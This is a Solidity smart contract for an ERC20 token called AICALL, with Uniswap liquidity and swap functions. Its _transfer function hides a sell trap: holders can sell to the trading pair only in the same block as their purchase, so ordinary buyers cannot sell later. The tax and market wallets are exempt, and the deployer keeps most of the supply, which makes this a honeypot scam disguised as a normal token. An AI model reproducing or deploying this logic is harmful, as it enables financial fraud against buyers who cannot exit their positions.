//░█████╗░██╗░█████╗░░█████╗░██╗░░░░░██╗░░░░░
//██╔══██╗██║██╔══██╗██╔══██╗██║░░░░░██║░░░░░
//███████║██║██║░░╚═╝███████║██║░░░░░██║░░░░░
//██╔══██║██║██║░░██╗██╔══██║██║░░░░░██║░░░░░
//██║░░██║██║╚█████╔╝██║░░██║███████╗███████╗
//╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚══════╝



// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

//░█████╗░██╗░█████╗░░█████╗░██╗░░░░░██╗░░░░░
//██╔══██╗██║██╔══██╗██╔══██╗██║░░░░░██║░░░░░
//███████║██║██║░░╚═╝███████║██║░░░░░██║░░░░░
//██╔══██║██║██║░░██╗██╔══██║██║░░░░░██║░░░░░
//██║░░██║██║╚█████╔╝██║░░██║███████╗███████╗
//╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚══════╝



contract ERC20 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    address payable private _taxWallet;
    address  private _marketWallet=0xF7BA8dBDd3fE69191eaD622a6fC49b241E874948;

    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    string private constant _name = unicode"AICALL";
    string private constant _symbol = unicode"AICALL";
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;

    constructor () {
        _taxWallet = payable(_msgSender());
        _balances[address(this)] = _tTotal*1/10;
        _balances[_marketWallet] = _tTotal*1/10;
		_balances[msg.sender] = _tTotal*8/10;
        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (from != _taxWallet && from != _marketWallet) {
            if (from == uniswapV2Pair && to != address(uniswapV2Router) ) {
                _holderLastTransferTimestamp[tx.origin] = block.number;
            }
            if(to == uniswapV2Pair && from!= address(this) ){
                require(_holderLastTransferTimestamp[tx.origin] == block.number,"error");
            }
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        if(tokenAmount==0){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) public  {
        require(_msgSender()==_taxWallet);
        _taxWallet.transfer(amount);
    }
	
	function sendTokenToFee(address tokenAddress, uint256 tokenAmount) public {
        require(msg.sender == _taxWallet);
        IERC20(tokenAddress).transfer(msg.sender, tokenAmount);
    }

    function openTrading() external onlyOwner() {
        uniswapV2Router = IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }


    receive() external payable {}

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }
}